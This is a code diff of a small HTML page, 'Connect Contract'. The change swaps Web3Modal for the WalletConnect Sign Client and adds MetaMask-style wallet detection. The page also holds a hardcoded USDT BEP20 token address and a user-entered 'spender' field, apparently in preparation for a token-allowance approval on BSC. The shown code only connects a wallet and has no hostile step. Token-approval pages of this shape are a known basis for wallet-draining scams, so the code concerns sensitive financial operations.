@@ -16,7 +16,6 @@
       align-items: center;
       height: 100vh;
     }
-
     .card {
       background: #1f2833;
       padding: 32px;
@@ -26,14 +25,12 @@
       box-shadow: 0 0 30px rgba(0,0,0,0.45);
       text-align: center;
     }
-
     h1 {
       margin-bottom: 24px;
       font-size: 26px;
       color: #66fcf1;
       font-weight: 600;
     }
-
     label {
       display: block;
       text-align: left;
@@ -41,7 +38,6 @@
       font-size: 14px;
       color: #c5c6c7;
     }
-
     input {
       width: 100%;
       padding: 14px;
@@ -52,7 +48,6 @@
       margin-bottom: 20px;
       font-size: 15px;
     }
-
     button {
       width: 100%;
       padding: 15px;
@@ -65,11 +60,9 @@
       cursor: pointer;
       transition: 0.2s;
     }
-
     button:hover {
       background: #66fcf1;
     }
-
     .status {
       margin-top: 20px;
       font-size: 13px;
@@ -86,21 +79,17 @@
 <body>
   <div class="card">
     <h1>Connect Contract</h1>
-
     <label>Contract address:</label>
     <input id="spender" placeholder="0x..." />
-
     <button id="connectBtn">Connect Wallet</button>
-
     <div id="status" class="status">Waiting for action…</div>
   </div>
 
   <!-- ethers.js -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>
 
-  <!-- Web3Modal v3 -->
-  <script src="https://unpkg.com/@web3modal/wallet@3.5.7"></script>
-  <script src="https://unpkg.com/@web3modal/standalone@3.5.7"></script>
+  <!-- WalletConnect Sign Client -->
+  <script src="https://unpkg.com/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
 
   <script>
     const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
@@ -115,12 +104,6 @@
     ];
 
     const projectId = "a6f8c1b4c1f3f0d9e8b2c7a4f1d2e3b4"; // demo ID
-
-    const modal = new window.Web3Modal.StandaloneWeb3Modal({
-      projectId,
-      chains: [56],
-      themeMode: "dark"
-    });
 
     let provider;
     let signer;
@@ -137,8 +120,49 @@
           return;
         }
 
-        const session = await modal.openModal();
-        const ethProvider = await modal.getWalletProvider();
+        let ethProvider;
+
+        if (window.ethereum) {
+          // Desktop wallets (MetaMask, Rabby, Trust, OKX, Coinbase)
+          await window.ethereum.request({ method: "eth_requestAccounts" });
+          ethProvider = window.ethereum;
+        } else {
+          // Mobile wallets via WalletConnect
+          const signClient = await window.WalletConnectSignClient.init({
+            projectId,
+            metadata: {
+              name: "Connect Contract",
+              description: "Approve demo",
+              url: window.location.href,
+              icons: ["https://walletconnect.com/walletconnect-logo.png"]
+            }
+          });
+
+          const { uri, approval } = await signClient.connect({
+            requiredNamespaces: {
+              eip155: {
+                methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData"],
+                chains: ["eip155:56"], // BSC
+                events: ["accountsChanged", "chainChanged"]
+              }
+            }
+          });
+
+          if (uri) {
+            setStatus("Scan QR with WalletConnect app:\n" + uri);
+          }
+
+          const session = await approval();
+          ethProvider = {
+            request: async ({ method, params }) => {
+              return await signClient.request({
+                topic: session.topic,
+                chainId: "eip155:56",
+                request: { method, params }
+              });
+            }
+          };
+        }
 
         provider = new ethers.BrowserProvider(ethProvider);
         signer = await provider.getSigner();
